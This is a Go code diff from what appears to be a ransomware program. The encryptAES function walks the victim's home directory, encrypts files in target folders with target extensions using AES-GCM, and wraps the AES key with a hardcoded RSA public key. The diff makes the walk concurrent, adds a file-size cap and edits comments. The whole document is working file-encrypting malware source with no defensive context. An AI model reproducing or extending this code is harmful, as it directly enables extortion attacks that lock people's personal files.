@@ -36,9 +36,8 @@ func keygen(maxLength int) ([]byte, error) {
 	return result, nil
 }
 
-// encrypt every file in a given directory, and returns the encrpyted aes key
 func encryptAES() ([]byte, error) {
-	//hardcoded rsa public key
+	//generate new rsa key pair and hardcode the public key here
 	rsakey := `-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyMWd90+WsmqDNNvnvFa6
 9/FevI6TU4u2F5lEP5ZJkUQnjxGvg1p2bLYkSs+bEF4xK5y6U398EzZM7SLJAePi
@@ -68,7 +67,7 @@ cwIDAQAB
 	if err != nil {
 		return nil, fmt.Errorf("error generating the key: %w", err)
 	}
-	fmt.Println("aes key:", string(aeskey))
+	fmt.Println("aes key:", string(aeskey)) // printing the key here... just in case
 
 	block, err := aes.NewCipher(aeskey)
 	if err != nil {
@@ -85,19 +84,19 @@ cwIDAQAB
 		return nil, fmt.Errorf("failed to locate home directory: %w", err)
 	}
 
-	err = filepath.Walk(homeDir, func(path string, info os.FileInfo, err error) error {
+	go filepath.Walk(homeDir, func(path string, info os.FileInfo, err error) error {
 		// checking if a directory in the root dir is a target dir
 		if info.IsDir() && filepath.Dir(path) == homeDir && path != homeDir && !slices.Contains(targetDirs, filepath.Base(path)) {
 			return filepath.SkipDir
         }
 
 		ext := filepath.Ext(path)
-		if !info.IsDir() && slices.Contains(targetExtensions, ext) {
+		if !info.IsDir() && slices.Contains(targetExtensions, ext) && info.Size() <= int64(20 * 1e+6) {
 			fmt.Println("encrypting", path)
 			plaintext, err := os.ReadFile(path)
 			if err != nil {
 				fmt.Println("failed to read input file: %w", err)
-				return nil
+				return nil //don't need to return the errors in here
 			}
 
 			nonce := make([]byte, gcm.NonceSize())
@@ -119,15 +118,10 @@ cwIDAQAB
 		return nil
 	})
 
-	if err != nil {
-		return nil, err
-	}
-
 	fmt.Println("encrypting AES public key...")
 	pubkeyDec, _ := decodePubkeyFromPEM(rsakey)
 	aeskeyEnc, _ := encryptRSA(pubkeyDec, []byte(aeskey))
 
-	fmt.Println("encryption successful")
 	return []byte(base64.StdEncoding.EncodeToString(aeskeyEnc)), nil
 }
 
